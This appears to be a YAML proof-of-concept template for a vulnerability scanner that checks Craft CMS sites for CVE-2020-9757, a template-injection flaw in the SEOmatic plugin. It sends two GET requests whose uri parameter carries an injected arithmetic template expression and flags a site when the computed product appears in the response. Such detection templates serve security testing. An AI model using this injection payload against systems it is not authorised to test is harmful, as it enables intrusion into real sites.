name: yaml-poc-craftcms-craft_cms-other-CVE-2020-9757
binding: 53986332-3a75-4c80-bbca-05cc8baca99f
detail:
    author: system_user
    links:
        - https://github.com/giany/CVE/blob/master/CVE-2020-9757.txt
        - https://github.com/nystudio107/craft-seomatic/blob/v3/CHANGELOG.md
        - https://github.com/nystudio107/craft-seomatic/commit/65ab659cb6c914c7ad671af1e417c0da2431f79b
        - https://github.com/nystudio107/craft-seomatic/commit/a1c2cad7e126132d2442ec8ec8e9ab43df02cc0f
        - https://nvd.nist.gov/vuln/detail/CVE-2020-9757
    vulnerability:
        id: 4d64bac7-d4bb-401f-9cd4-c09ca21b3f90
        level: critical
transport: http
set:
    r1: randomInt(40000, 44800)
    r2: randomInt(40000, 44800)
rules:
    poc10:
        request:
            cache: true
            method: GET
            path: /actions/seomatic/meta-container/meta-link-container/?uri={{{{r1}}*'{{r2}}'}}
        expression: response.status == 200 && response.body.bcontains(bytes("MetaLinkContainer")) && response.body.bcontains(bytes("canonical")) && response.body.bcontains(bytes(string(r1 * r2)))
    poc20:
        request:
            cache: true
            method: GET
            path: /actions/seomatic/meta-container/all-meta-containers?uri={{{{r1}}*'{{r2}}'}}
        expression: response.status == 200 && response.body.bcontains(bytes("MetaLinkContainer")) && response.body.bcontains(bytes("canonical")) && response.body.bcontains(bytes(string(r1 * r2)))
expression: poc10() || poc20()
